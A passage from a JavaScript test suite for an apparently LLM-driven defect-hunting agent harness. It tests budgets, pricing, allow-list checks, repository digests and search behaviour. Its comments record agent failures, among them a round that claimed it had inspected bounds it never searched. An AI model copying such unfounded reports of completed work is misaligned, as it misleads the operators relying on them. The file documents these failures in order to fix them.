  chk('  a repeat attempt escalates to "send less"', /attempt 2/.test(jsonFailure("nope", 2).guidance));
  chk('  but a first attempt does not nag about it', !/attempt 1/.test(jsonFailure("nope", 1).guidance));

  chk('  the turn loop emits an event instead of failing silently', /emit\(run, "unparsed"/.test(src3));
  const code3 = src3.split("\n").filter((l) => !/^\s*\/\//.test(l)).join("\n");
  chk('  and the old contentless line is gone from the code',
      !/That was not valid JSON\. Reply again with STRICT JSON only\./.test(code3));
}
console.log("# an empty reply reports what was actually spent, and the retry pulls the right lever");
{
  const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  // The measured round. Everything else about it was right — one file in scope, the defective file opened FIRST,
  // read whole — and it produced nothing because the entire output budget went to thinking.
  const why = blankReplyReason({ output: 29246, reasoning: 29125 });
  chk('  it names the split instead of saying "returned nothing"', /29,125 of 29,246/.test(why));
  chk('  and the share it took', /\(100%\)/.test(why));
  chk('  and what was left for the answer', /leaving 121/.test(why));
  // A bigger budget was the old response, and saying so is the point: an instrument that names the wrong cause
  // sends the next fix in the wrong direction, and this one did that eleven times in a row.
  chk('  it says a larger budget would not help', /larger budget would only buy more reasoning/.test(why));
  // On a Danish machine toLocaleString() rendered 29,125 as "29.125" — a decimal, in a line that is nothing but
  // numbers, and reading differently on different machines for the same run.
  chk('  the numbers group unambiguously whatever the machine locale', !/29\.125|29\.246/.test(why));

  const mild = blankReplyReason({ output: 2000, reasoning: 500 });
  chk('  a mild split still reports itself', /500 of 2,000/.test(mild) && /\(25%\)/.test(mild));
  chk('  but does not blame the budget, which at 25% is not established', !/larger budget/.test(mild));
  chk('  no usage at all says so rather than inventing a cause', /reported no token split/.test(blankReplyReason(null)));
  chk('  and a zero-output split does not divide by zero', typeof blankReplyReason({ output: 0, reasoning: 0 }) === "string");

  eq('  the cap sent on the retry is minimal effort AND thinking off',
     NO_THINKING, { reasoningEffort: "minimal", thinking: { type: "disabled" } });

  // Wiring. The old string must be GONE, not merely joined by a new one — a log still saying "retrying with a
  // larger output budget" while actually capping the thinking is a worse instrument than either behaviour alone.
  // The cap now applies from the FIRST call, not only the retry. Measured on the round that forced the change:
  // capping only the retry left an uncapped call at the head of every turn, and that call returned "1,000 of
  // 1,000 output tokens (100%) went to reasoning" on eleven of twelve turns — a wasted round trip per turn, for
  // thinking that was then discarded rather than carried forward.
  chk('  the FIRST call of a turn is capped', /raw = await askCapped\(TURN_TOKENS\)/.test(src));
  chk('  and the retry gets MORE room, the only lever left once thinking is capped',
      /raw = await askCapped\(TURN_TOKENS_RETRY\)/.test(src));
  // The budget is a measured number now, not a guess. Five rounds produced eight unparsed replies and every one
  // was TRUNCATED at the old 1,000 — a register_finding action carries a claim, a url, details and a check
  // command, and one round lost all four of its turns to replies cut off mid-object.
  chk('  the first-call budget is big enough for a whole register_finding action', TURN_TOKENS >= 2600);
  chk('  and the retry gets strictly more than the first call', TURN_TOKENS_RETRY > TURN_TOKENS);
  // Against the CODE, not the whole file. The first version searched the source and failed on the COMMENT that
  // quotes the old line in order to explain why it was wrong — an assertion satisfiable by deleting the
  // explanation. Strip comment lines and ask what the runner actually emits.
  const code = src.split("\n").filter((l) => !/^\s*\/\//.test(l)).join("\n");
  chk('  and no longer claims a larger budget is the first move',
      !/retrying with a larger output budget/.test(code));
  chk('  CONTROL: stripping comments did not just empty the haystack', code.includes("askCapped(TURN_TOKENS)"));
  chk('  a provider that refuses the cap falls back rather than failing the turn', /capRefused: true/.test(src));
  // One refusal per RUN, not per turn: re-sending a field the provider has already rejected would cost an extra
  // round trip on every remaining turn.
  chk('  and it remembers the refusal for the rest of the run',
      /run\.capUnsupported = true/.test(src) && /run\.capUnsupported\) return ask\(maxTokens\)/.test(src));
  // askLlm has to actually forward them, or every line above describes a request that was never sent.
  chk('  and askLlm forwards both fields to Latch',
      /reasoningEffort: opts\.reasoningEffort/.test(src) && /thinking: opts\.thinking/.test(src));
}
console.log("# JSON mode: the provider is constrained to valid JSON, not asked nicely for it");
{
  const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  // Ten rounds, fourteen unparsed replies, every one truncated mid-object — and raising the budget moved nothing
  // (8 -> 6 on n=5, hit rate identical). Constrained decoding removes the class instead of shrinking it.
  eq('  the shape is exactly what Latch allowlists', JSON_REPLY, { responseFormat: { type: "json_object" } });
  chk('  askLlm forwards it', /responseFormat: opts\.responseFormat/.test(src));
  chk('  the turn loop sends BOTH extras on capped calls', /\{ \.\.\.NO_THINKING, \.\.\.JSON_REPLY \}/.test(src));
  // The prompt must contain the word "json" or DeepSeek's json_object mode errors — the system prompt already
  // demands STRICT JSON, which is the same fact stated for the model rather than the provider.
  chk('  and the system prompt contains the word JSON, which json_object mode requires',
      /STRICT JSON/.test(src));
}
console.log("# a refusal carries what the check actually printed");
{
  // The refusal used to be one contentless line, and the check's stdout was discarded at the source — the agent
  // named the planted defect correctly three times in one round and retried blind three times.
  const io = (afterOut) => ({
    sh: async (cmd) => stepIo(cmd, afterOut),
    apply: async () => true, revert: async () => {},
  });
  // First call fails (the check sees the defect), second call fails TOO (the fix did not help) — the refusal path.
  let calls = 0;
  const stepIo = (_cmd, afterOut) => (++calls === 1 ? { ok: false, out: "1 failing" } : { ok: false, out: afterOut });
  const v = await verifyFinding(
    { claim: "c", where: "src/a.mjs:1", check: "npm test", fix: { file: "f", find: "a", replace: "b" } },
    io("AssertionError: min was 0 but the smallest count is 24\n    at test/x.mjs:9"));
  chk('  the refusal reason is unchanged', v.ok === false && /does not make the check pass/.test(v.reason));
  chk('  and it now carries the check output', /min was 0 but the smallest count is 24/.test(v.checkOut || ""));

  // The vacuous case carries output too — "your check printed `1 passing` against the real code" is the evidence.
  calls = 0;
  const passIo = { sh: async () => ({ ok: true, out: "2 passing" }), apply: async () => true, revert: async () => {} };
  const v2 = await verifyFinding(
    { claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, passIo);
  chk('  a vacuous check is refused WITH its output', /passes already/.test(v2.reason) && v2.checkOut === "2 passing");

  // Older io doubles return only { ok } — the tail must not crash on undefined, and the turn loop only appends
  // when there is something to say.
  calls = 0;
  const bareIo = { sh: async () => ({ ok: false }), apply: async () => true, revert: async () => {} };
  const v3 = await verifyFinding(
    { claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, bareIo);
  chk('  an io double with no output still works, and says nothing rather than "undefined"', v3.checkOut === "");

  eq('  the tail keeps the END, where node --test puts the assertion',
     checkOutTail("A".repeat(900) + " THE MESSAGE", 20), "…" + ("A".repeat(900) + " THE MESSAGE").slice(-20));

  // Behavioural, after a control exposed the source-scrape version as blind: mutating the inline guard to
  // `false ?` left the message text present-but-unreachable and the suite stayed green. Call the builder instead.
  chk('  the refusal message contains the output when there is one',
      /AssertionError: boom/.test(refusalMessage("r", "AssertionError: boom")));
  chk('  and no dangling header when there is not', !/printed/.test(refusalMessage("r", "")));
  const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  chk('  the turn loop hands the agent the builder output, output included',
      /refusalMessage\(v\.reason, v\.checkOut\)/.test(src));
  chk('  and the event carries it for the UI', /checkOut: v\.checkOut \|\| ""/.test(src));
}
console.log("# a tier's model is an override, and only when the provider actually serves it");
{
  // Measured the first time a non-Kimi provider was configured. Latch's fallback was deepseek-v4-flash; Bureau
  // announced "TIER: paid · kimi-k2.6", sent that name, and DeepSeek answered "The supported API model names are
  // deepseek-v4-pro or deepseek-v4-flash, but you passed kimi-k2.6". Every turn died, the run finished with $0
  // spent and no findings, and the tier event had already said "paid" — so the failure looked like "paid was
  // never available" rather than "Bureau overrode the operator's model with one that does not exist here".
  eq('  a model the provider does not serve is not sent at all',
     tierModelToSend("kimi-k2.6", "deepseek-v4-flash"), "");
  eq('  a model the provider does serve is sent, so tiers still work on Kimi',
     tierModelToSend("kimi-k2.6", "kimi-k2.6"), "kimi-k2.6");
  // The control. If it returned "" whenever the names differ INCLUDING when nothing is configured, the tier
  // catalogue would be silently dead for every operator whose Latch build predates the model field.
  eq('  an unknown configured model leaves the tier choice alone', tierModelToSend("kimi-k2.6", ""), "kimi-k2.6");
  eq('  no tier model means no model, not undefined', tierModelToSend("", "deepseek-v4-flash"), "");
  chk('  and the empty result is falsy, which is what the send site spreads on',
      !tierModelToSend("kimi-k2.6", "deepseek-v4-flash"));
}
console.log("# a paid call is priced by its token split, not by one blended rate");
{
  // Both rows are the SAME hunt round on the same tiny repository, measured through Bureau's own usage split.
  const kimi = { total: 12989, input: 9069, cached: 6144, output: 3920, reasoning: 3546, estimated: false };
  const deep = { total: 11417, input: 9520, cached: 8704, output: 1897, reasoning: 1507, estimated: false };
  const tier = { model: "kimi-k2.6", pricePer1K: 0.002 };
  const near = (a, b) => Math.abs(a - b) < 5e-7;

  const k = callCostUsd(kimi, "kimi-k2.6", tier);
  const d = callCostUsd(deep, "deepseek-v4-flash", tier);
  chk('  kimi round costs $0.019442 (2925 miss + 6144 cached + 3920 out)', near(k, 0.019442));
  chk('  deepseek round costs $0.000670', near(d, 0.00066977));

  // The whole point: the flat rate said 1.14x and the invoice says 29x. If pricing ever regresses to flat, this
  // ratio collapses and the assertion fails — which is the only reason the two numbers above are worth having.
  chk('  and deepseek comes out ~29x cheaper, not ~1.1x', k / d > 25 && k / d < 33);
  const flatK = (kimi.total / 1000) * 0.002, flatD = (deep.total / 1000) * 0.002;
  chk('  the control: the flat rate really would have said ~1.1x', flatK / flatD > 1.1 && flatK / flatD < 1.2);

  // Fallbacks. Neither invents a rate.
  eq('  an unlisted model keeps the old flat behaviour',
     callCostUsd({ total: 10000, input: 8000, cached: 0, output: 2000 }, "kimi-k3", { model: "kimi-k3", pricePer1K: 0.006 }), 0.06);
  eq('  a provider that reported no split is charged flat on the estimate',
     callCostUsd({ total: 10000, input: null, output: null, estimated: true }, "deepseek-v4-flash", tier), 0.02);
  chk('  cached tokens exceeding input never produce a negative charge',
      callCostUsd({ total: 100, input: 10, cached: 999, output: 0 }, "deepseek-v4-flash", tier) >= 0);
}
console.log("# …and an unrated model SAYS SO, instead of failing silently into that flat rate");
{
  // The assertion directly above uses "kimi-k3" as its example of an unlisted model. kimi-k3 is not
  // hypothetical: it is the "heavy" entry in PAID_TIERS, offered in the agent editor's own dropdown. So the
  // degrade that test documents is reachable today, through the UI, with nothing said about it anywhere.
  eq('  a rated model warns about nothing', unratedModelWarning("kimi-k2.6"), "");
  eq('  neither does a blank one', unratedModelWarning(""), "");
  eq('  nor undefined, which is what a provider reporting no model gives', unratedModelWarning(undefined), "");
  const w = unratedModelWarning("gpt-5-turbo-imaginary");
  chk('  floor: an unrated model produces a real warning', w.length > 200);
  chk('  it NAMES the model', w.includes("gpt-5-turbo-imaginary"));
  // The consequence is the half that makes it actionable — "unknown model" alone tells an operator nothing.
  chk('  it names the estimate as flat/blended', /flat blended/i.test(w));
  chk('  it names the budget cap as wrong, which is the part that costs money', /budgetUsd caps/i.test(w) && /cut off at the wrong spend/i.test(w));
  chk('  and it says where to fix it', /MODEL_RATES/.test(w));

  // The static, boot-time half: what this build OFFERS vs what it can PRICE. No Latch, no provider, no run.
  const gaps = unratedTierModels();
  chk('  floor: the check returns a list at all', Array.isArray(gaps));
  chk('  kimi-k3 is offered as the "heavy" tier and CANNOT be priced — live, today', gaps.includes("kimi-k3"));
  // Without this the assertion above would also pass for a function that simply returns every tier model.
  chk('  and it is discriminating: the rated tiers are absent',
      !gaps.includes("kimi-k2.6") && !gaps.includes("kimi-k2.7-code"), JSON.stringify(gaps));
  eq('  a build whose tiers are all rated reports nothing',
     unratedTierModels({ a: { model: "x" } }, { x: { miss: 1, cached: 1, out: 1 } }), []);
  eq('  and one whose tiers are all unrated reports each of them once',
     unratedTierModels({ a: { model: "x" }, b: { model: "x" }, c: { model: "y" } }, {}), ["x", "y"]);

  // Warned once per model per process: a per-call warning is a per-turn warning, and that is not readable.
  const M = "unrated-fixture-model-" + Date.now();
  chk('  the first sighting warns', warnUnratedModel(M).includes(M));
  eq('  the second stays quiet', warnUnratedModel(M), "");
  eq('  a rated model never warns at all', warnUnratedModel("deepseek-v4-pro"), "");
}
console.log("# a hunt refuses at the START if its agent cannot read the repository");
{
  // Measured, not imagined: a live round spent 505 seconds and $0.36 opening ZERO files. The prompt advertises
  // read_repo whenever guardrails.findingRepo is set, without asking whether the agent may use it, so an agent whose
  // allow list omits it was told to use a tool it could not use. It reached for read_file, the deliverables,
  // github_file and a raw GitHub URL, then said "I cannot examine the repository because read_repo is blocked".
  // The round was unwinnable when it started, and nothing said so until the money was gone.
  chk('  an empty allow list means unrestricted, which is the default', agentMayRun({ allow: [] }, 'read_repo'));
  chk('  and so does no list at all', agentMayRun({}, 'read_repo') && agentMayRun(null, 'read_repo'));
  chk('  a list that names the action permits it', agentMayRun({ allow: ['read_file', 'read_repo'] }, 'read_repo'));
  chk('  a list that does not, refuses it', !agentMayRun({ allow: ['read_file', 'github_file'] }, 'read_repo'));
  // The exact allow list the live round ran with, so the case that cost the money is the fixture rather than my
  // idea of it — the same discipline that turned "Done." into a fixture after a detector was fooled by one.
  const LIVE = ['web_search', 'web_research', 'file_write', 'read_file', 'api_call', 'github_file',
                'read_issues', 'github_issue', 'github_comment', 'github_pr'];
  chk('  the real allow list from that round is refused read_repo', !agentMayRun({ allow: LIVE }, 'read_repo'));
  chk('  while the actions it did reach for were all permitted',
      ['read_file', 'github_file', 'web_research'].every((a) => agentMayRun({ allow: LIVE }, a)));
  {
    // The turn loop and the pre-flight must ask the SAME question, or the pre-flight predicts something else.
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  the turn loop asks it', /if \(!agentMayRun\(agent, actType\)\)/.test(src));
    chk('  and the hunt asks the SAME function, before spending a turn', /if \(!agentMayRun\(agent, "read_repo"\)\)/.test(src));
    // The half that matters: no second copy of the rule left behind to drift out of step with this one.
    chk('  and the inlined original is gone',
        !/Array\.isArray\(agent\.allow\) && agent\.allow\.length && !agent\.allow\.includes/.test(src));
  }
}
console.log("# the map puts what nobody has opened first, and says how much of the repo a round has not been near");
{
  // Five rounds against one repository spent 41 of 50 searches inside src/server.mjs and never opened the file
  // holding the planted defect. A round's record was {lens, at, confirmed, dryAfter} — lens coverage tracked, file
  // coverage not tracked at all — so that fact was not on the run, not in any event, and had to be recovered from
  // the audit log afterwards. This is the missing half: record what was opened, order the map by it, say the number.
  const mk = (f, bytes) => ({ file: f, bytes, symbols: [], more: false, big: false });
  const d = { ok: true, readCap: 12000, total: 3, shown: 3, entries: [mk('src/a.mjs', 100), mk('src/b.mjs', 200), mk('src/c.mjs', 300)] };

  const cold = digestText(d);
  chk('  with nothing opened the map keeps its natural order', cold.indexOf('src/a.mjs') < cold.indexOf('src/c.mjs'));
  chk('  and says nothing about coverage, because there is nothing to say', !cold.includes('(read)'));

  const run = {};
  noteRepoRead(run, 'src/a.mjs');
  const warm = digestText(d, 8000, run.filesSeen);
  chk('  an opened file is marked as opened', /src\/a\.mjs[^\n]*\(read\)/.test(warm));
  chk('  and sinks BELOW the files nobody has opened', warm.indexOf('src/a.mjs') > warm.indexOf('src/c.mjs'));
  chk('  the header states the coverage as a fraction', warm.includes('opening 1 of 3 files'));
  chk('  and the unopened ones carry no marker', !/src\/b\.mjs[^\n]*\(read\)/.test(warm));
  // The control that the ordering is doing something rather than the list happening to be in that order already.
  chk('  every file is still listed — ordering, not filtering',
      ['src/a.mjs', 'src/b.mjs', 'src/c.mjs'].every((f) => warm.includes(f)));

  eq('  coverage counts what is left', repoCoverage(d, run.filesSeen).unseen, ['src/b.mjs', 'src/c.mjs']);
  eq('  and with nothing opened, everything is left', repoCoverage(d, null).seen, 0);
  eq('  with everything opened, nothing is', repoCoverage(d, new Set(['src/a.mjs', 'src/b.mjs', 'src/c.mjs'])).unseen, []);

  // A LISTING and a whole-repository search are not coverage. Counting them would let a round call itself thorough
  // for having typed read_repo with a blank title, which is exactly the move a dry round makes.
  const r2 = {};
  for (const junk of ['src/', '*', '.', '', null, undefined]) noteRepoRead(r2, junk);
  eq('  a listing, a wildcard and a blank are not files opened', (r2.filesSeen ? r2.filesSeen.size : 0), 0);
  noteRepoRead(r2, 'src' + String.fromCharCode(92) + 'w.mjs');
  chk('  and a windows-shaped path is recorded under its posix name', r2.filesSeen.has('src/w.mjs'));
}
console.log("# a truncated read says WHICH declarations lost their body, not just that the file was cut");
{
  // The 155 characters five hunting rounds could not have crossed. This project's planted defect sits at character
  // 12,155 of a 12,263-character file against a 12,000-character cap: the outline named the function, the body
  // stopped 155 characters short of its return, and nothing in the reply distinguished "you have read this" from
  // "you have read its name". Reproduced in miniature so the assertion does not depend on a scratchpad clone.
  const LF = String.fromCharCode(10);
  const filler = (n) => new Array(n).fill('  // filler, and not a declaration').join(LF);
  const full = [
    'export function alpha(a) {', filler(20), '  return a;', '}', '',
    'export function omega(b) {', filler(20), '  return { min: 0 };', '}', '',
    'export function afterTheCut(c) {', '  return c;', '}',
  ].join(LF);
  // Cut where the real one cut: inside omega, just before the line that decides its value.
  const shown = full.slice(0, full.indexOf('  return { min: 0 };'));
  chk('  precondition: the cut really does hide the return', !shown.includes('min: 0') && full.includes('min: 0'));

  const o = repoOutline(full);
  const marked = markOutlineVisibility(o.symbols, shown, o.lines);
  const seenOf = (n) => (marked.find((s) => s.text.includes(n)) || {}).seen;
  eq('  a function whose body is wholly inside the shown part is seen', seenOf('alpha'), 'seen');
  eq('  one whose RETURN falls past the cut is partial', seenOf('omega'), 'partial');
  eq('  one declared past the cut is unseen', seenOf('afterTheCut'), 'unseen');

  // The control. Without it a marker that fired on everything passes all three assertions above, and every
  // complete read carries a warning that means nothing.
  chk('  on a COMPLETE read nothing is flagged, including the last declaration',
      markOutlineVisibility(o.symbols, full, o.lines).every((s) => s.seen === 'seen'));
  chk('  and with no line count to compare against it does not guess',
      markOutlineVisibility(o.symbols, shown, 0).every((s) => s.seen === 'seen'));

  // Now the string the agent is actually handed. The helper above was correct and unreachable from any prompt for
  // an hour, and a test grepping server.mjs for the wiring would have passed throughout.
  const reply = repoReadReply({ name: 'src/roster.mjs', shown, full, bytes: full.length, truncated: true });
  chk('  the reply marks the half-shown function', /omega[^\n]*body CUT OFF/.test(reply));
  chk('  and the one it never reached', /afterTheCut[^\n]*NOT in the body above/.test(reply));
  chk('  the function it did show carries no marker',
      !/CUT OFF|NOT in the body/.test(reply.split(LF).find((l) => l.includes('alpha(')) || 'CUT OFF'));
  chk('  it counts them, because the count is what makes it act', reply.includes('2 of those are wholly or partly outside'));
  chk('  and points at a search rather than another read', /SEARCH it rather than re-reading/.test(reply));

  // The negative control on the whole instrument: an untruncated read must say none of this.
  const complete = repoReadReply({ name: 'src/roster.mjs', shown: full, full, bytes: full.length, truncated: false });
  chk('  a complete read carries no cut-off language at all',
      !/CUT OFF|NOT in the body above|wholly or partly outside/.test(complete));
  chk('  but still hands over the source', complete.includes('min: 0') && complete.includes('REAL current source'));
}
console.log("# a search with a blank title must not become a directory listing");
{
  // The worst of the three dispatch defects, because it produced a CONFIDENT WRONG CONCLUSION rather than a zero.
  // `want` fell back to `command`, so with a blank title want BECAME the search term, `term !== want` was false,
  // and the search branch was skipped entirely. Seven searches in one live round — Infinity, -1, skip, timeout,
  // limit, '= null', '= true' — each returned a 106-file listing. The agent then reported 'this lens revealed no
  // dangerous defaults; every bound I inspected is explicit and safe', having run none of them.
  const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
  // Scoped to the read_repo branch: another action legitimately uses the title||command||details fallback, so a
  // whole-file search reports a defect that is not there.
  const rr = src.slice(src.indexOf('=== "read_repo") {'));
  const branch = rr.slice(0, rr.indexOf('=== "propose_lens") {'));
  chk('  the read_repo branch was located', branch.length > 500);
  chk('  its path field no longer falls back to the search term',
      !branch.includes('next.title || next.command'));
  // The control: the term must still come from command, or the search has no input at all.
  chk('  and the term is still taken from command', branch.includes('termRaw = String(next.command'));
  chk('  a command naming a real file is still honoured as a path',
      branch.includes('resolveRepoTarget(all.files || [], termRaw)'));
}
console.log("# the search takes a pattern too, and says which way it read the term");
{
  // Found by a paid hunting round: the model sends regexes, because every search tool it has met takes them.
  // Literal matching returned 0 for all of them and it read absence. The same file, searched for the plain
  // literal 'assert', returned 16 — so the zeros were the tool, not the code. A false-absence machine inside
  // the instrument built to prevent false absence.
  chk('  alternation reads as a pattern', looksLikeRegex('a\\.b|c'));
  chk('  and a dot-star', looksLikeRegex('for.*body'));
  chk('  and a character class', looksLikeRegex('[A-Z]+Token'));
  // The control: ordinary code text must NOT be reinterpreted, or every literal search changes meaning.
  chk('  a call with parens stays literal', !looksLikeRegex('db.prepare('));
  chk('  a plain word stays literal', !looksLikeRegex('assert'));
  chk('  a path stays literal', !looksLikeRegex('src/db.mjs'));
  // A model-supplied pattern runs in this process and Node has no regex timeout.
  chk('  a nested quantifier is refused', unsafeRegex('(a+)+b'));
  chk('  and an over-long pattern', unsafeRegex('x'.repeat(201)));
  chk('  while a sane pattern is allowed', !unsafeRegex('assert\\.ok|assert\\.equal'));
  {
    // The bytes a search hands back ARE the bytes an agent anchors a fix to. Trimming them guarantees the anchor
  // cannot match: measured on a live run, a finding with the right line, the right quote style and the right
  // variable name was refused only because the leading indentation had been stripped before the model ever saw it.
  {
    const R2 = mkdtempSync(join(tmpdir(), 'repo-indent-'));
    try {
      const { mkdirSync: md, writeFileSync: wf } = await import('node:fs');
      md(join(R2, 'src'));
      const real = '    const c = gate({ req, res });';   // four leading spaces, as in real source
      wf(join(R2, 'src', 'a.mjs'), 'export function h() {' + String.fromCharCode(10) + real + String.fromCharCode(10) + '}' + String.fromCharCode(10));
      const r = await searchRepoFiles(R2, 'gate({ req', 'src/a.mjs');
      // Control first: if it found nothing, the byte assertion below would pass on an empty list.
      chk('  the indented line is found at all', r.ok === true && r.hits.length === 1);
      chk('  search results keep the line exactly, indentation included',
          r.ok === true && r.hits.length === 1 && r.hits[0].text === real);
    } finally { rmSync(R2, { recursive: true, force: true }); }
  }
  // ---- the whole-repo digest: what exists, how big, and what it declares --------------------------------------
  //
  // Four live rounds were spent groping file by file, three of them never leaving the first big file they opened.
  // The agent had no way to know what existed until it opened something. This is repomix's --compress idea using
  // what Bureau already has: no dependency, no shell, and computed at round start so it cannot go stale.
  {
    const R3 = mkdtempSync(join(tmpdir(), 'repo-digest-'));
    try {
      const { mkdirSync: md, writeFileSync: wf } = await import('node:fs');
      md(join(R3, 'src'));
      const NL = String.fromCharCode(10);
      wf(join(R3, 'src', 'small.mjs'), 'export function tiny() { return 1; }' + NL);
      wf(join(R3, 'src', 'big.mjs'),
         'export function alpha() {}' + NL + 'app.get("/route", h);' + NL + 'x'.repeat(20000) + NL);
      wf(join(R3, 'src', 'quiet.mjs'), '// no declarations at all' + NL + 'y'.repeat(50) + NL);
      wf(join(R3, 'notes.md'), 'not source' + NL);
      const d = await repoDigest(R3, { readCap: 1000 });
      chk('  the digest covers the source files and skips non-source', d.ok === true && d.total === 3);
      const t = digestText(d);
      // THE load-bearing property: every file appears, whatever the budget did to the symbol breakdown. A partial
      // inventory is how an agent concludes something is absent when it was simply never shown.
      chk('  every source file appears in the index',
          t.includes('src/small.mjs') && t.includes('src/big.mjs') && t.includes('src/quiet.mjs'));
      chk('  a file with no declarations is still listed', t.includes('src/quiet.mjs'));
      chk('  and a non-source file is not', !t.includes('notes.md'));
      chk('  a file too big for one read is marked as such', /src\/big\.mjs\s+[\d,.]+\s+\(>read\)/.test(t));
      chk('  while a small one is not', !/src\/small\.mjs\s+[\d,.]+\s+\(>read\)/.test(t));
      chk('  route registrations reach the digest, not only declarations', t.includes('app.get("/route"'));
      // A budget too small to break anything down must still yield the complete index, and say what it left out.
      const tight = digestText(d, 400);
      chk('  under a tight budget the index survives and the breakdown is what gives way',
          tight.includes('src/small.mjs') && tight.includes('src/big.mjs') && tight.includes('src/quiet.mjs'));
      chk('  and it says how many were not broken down', /not broken down/.test(tight));
      // CONTROL: an unreadable repo returns a reason rather than an empty digest that reads as "nothing here".
      const bad = await repoDigest(join(R3, 'nope'));
      chk('  a repo that cannot be listed reports why instead of looking empty',
          bad.ok === false && !!bad.error);
      chk('  and renders as nothing at all rather than a misleading heading', digestText(bad) === '');
    } finally { rmSync(R3, { recursive: true, force: true }); }
  }

  // ---- old read bodies collapse, because history is re-sent whole on every turn -------------------------------
  {
    // A REALISTIC body. The first version of this test used five lines, and the collapsed form — a warning plus an
    // outline — came out LARGER than what it replaced, 542 characters becoming 869. That is what the shrink
    // assertion at the end is for, and it is why collapseReads has a size floor.
    const filler = new Array(60).fill('  // a line of implementation that carries no declaration at all').join(String.fromCharCode(10));
    const body = ['export function alpha() {', '  return 1;', '}', 'const beta = () => {};',
                  'app.get("/thing", handler);', filler].join(String.fromCharCode(10));
    const mk = (file) => ({ role: 'user', _read: { file, content: body, bytes: body.length },
                            content: 'APPROVED and EXECUTED — ' + file + ':' + String.fromCharCode(10) + body });
    const history = [{ role: 'system', content: 'sys' }, mk('a.mjs'), { role: 'assistant', content: 'ok' },
                     mk('b.mjs'), mk('c.mjs')];
    const out = collapseReads(history, 2);
    chk('  collapsing preserves the message count and order', out.length === history.length && out[0].content === 'sys');
    chk('  the two most recent read bodies are kept verbatim',
        out[3].content.includes('return 1;') && out[4].content.includes('return 1;'));
    chk('  an older read body is gone', !out[1].content.includes('return 1;'));
    chk('  and it names the file it was', out[1].content.includes('a.mjs'));
    // The load-bearing part: an agent that half-remembers a body invents fix anchors, which is a refused finding.
    chk('  a collapsed read says it can no longer be quoted from',
        /NO LONGER QUOTE FROM IT/.test(out[1].content));
    chk('  while still reporting what the file declares, so absence stays answerable',
        out[1].content.includes('export function alpha') && out[1].content.includes('app.get("/thing"'));
    // Nothing local may reach a provider: askLlm passes the array straight through to Latch.
    chk('  no message carries anything but role and content',
        out.every((m) => Object.keys(m).length === 2 && 'role' in m && 'content' in m));
    // Non-read messages must be untouched, or collapsing would eat the conversation itself.
    chk('  non-read messages pass through unchanged', out[2].content === 'ok');
    // CONTROL: with fewer reads than the keep count, nothing is collapsed at all.
    const few = collapseReads([{ role: 'system', content: 'sys' }, mk('a.mjs')], 2);
    chk('  and with fewer reads than the keep count nothing collapses', few[1].content.includes('return 1;'));
    // CONTROL: a SMALL body is left alone however old it is, because replacing it would cost more than it saves.
    const small = { role: 'user', _read: { file: 'tiny.mjs', content: 'export const x = 1;', bytes: 19 },
                    content: 'APPROVED and EXECUTED — tiny.mjs:' + String.fromCharCode(10) + 'export const x = 1;' };
    const withSmall = collapseReads([small, mk('b.mjs'), mk('c.mjs'), mk('d.mjs')], 2);
    chk('  a small old read is left verbatim rather than "saved" into something bigger',
        withSmall[0].content.includes('export const x = 1;'));
    // It must actually SHRINK, or the whole exercise is decorative.
    const before = JSON.stringify(history.map((m) => ({ role: m.role, content: m.content }))).length;
    const after = JSON.stringify(out).length;
    chk('  the collapsed history is smaller than the original (' + before + ' -> ' + after + ')', after < before);
  }

  // ---- the outline must report what a file is MADE of, not only what it declares -----------------------------
  //
  // A truncated read leans on the outline for everything it could not show. 4water's src/server.mjs is 79,219
  // characters against a 12,000-character cap, and the outline reported 15 symbols and NONE of its 50 routes — so
  // the file's most prominent entries were `gate` and `postGate`, and two live hunting rounds spent themselves
  // trying to read those two bodies by search. One of those rounds had the agent's memory deliberately cleared,
  // which ruled out the anchoring explanation and left this one.
  {
    const NL = String.fromCharCode(10);
    const routeFile = [
      'export function buildApp({ db }) {',
      '  const gate = ({ req, res }, role = null) => {};',
      '  app.get("/healthz", ({ res }) => send(res, 200));',
      '  app.post("/board/:id/claim", async ({ req, res }) => {});',
      '  if (devAuth) app.post("/auth/dev", async ({ req, res }) => {});',
      '  app.get(notAStringSoNotARoute, handler);',
      '  helper.getThing(1);',
      '}',
    ].join(NL);
    const texts = repoOutline(routeFile).symbols.map((s) => s.text);
    chk('  the outline reports route registrations, not only declarations',
        texts.filter((t) => t.startsWith('app.get("') || t.startsWith('app.post("')).length === 2);
    chk('  including one registered behind a condition',
        texts.some((t) => t.startsWith('if (devAuth) app.post("/auth/dev"')));
    // CONTROL 1: the new patterns must not DISPLACE the old ones — an outline of only routes is the same failure
    // pointing the other way.
    chk('  and the declarations are still reported',
        texts.some((t) => t.startsWith('export function buildApp')));
    // CONTROL 2: a pattern that matched every method call would satisfy both assertions above while making the
    // outline noise. The string-literal first argument is what keeps it to things being REGISTERED under a name.
    chk('  while a call with no string argument is not mistaken for a registration',
        !texts.some((t) => t.startsWith('app.get(notAString')) && !texts.some((t) => t.startsWith('helper.getThing')));
  }

  // ---- the prompt's worked examples must survive the gate they demonstrate ----------------------------------
  {
    // Read here rather than borrowed: every other block in this file scopes its own `src`, so relying on one would
    // depend on which block happened to run first.
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    // From the BUILT prompt, not from the source text. Unescaping the source by hand needs two layers undone in the
    // right order, and getting it wrong made these assertions fail against examples that were perfectly valid — the
    // probe was broken, not the thing probed. The built string is also what the model actually reads.
    const prompt = systemPrompt({ guardrails: { findingRepo: '/tmp/x' } }, { name: 'A', role: 'r' }, { phase: 'investigate' });
    const lines = String(prompt).split(String.fromCharCode(10)).filter((l) => l.includes('register_finding","title"'));
    chk('  both register_finding examples are present in the prompt', lines.length === 2);
    let ok = 0, probeForm = 0;
    for (const l of lines) {
      const start = l.indexOf('{"thought"');
      const end = l.lastIndexOf('}}}');
      if (start < 0 || end < 0) continue;
      let o; try { o = JSON.parse(l.slice(start, end + 3)); } catch { continue; }
      const n = o.next || {};
      const shape = normalizeFinding({ claim: n.title, class: n.details, where: n.url, check: n.command,
                                       probe: n.probe, fix: n.fix });
      if (shape.ok) ok++;
      if (n.probe) probeForm++;
    }
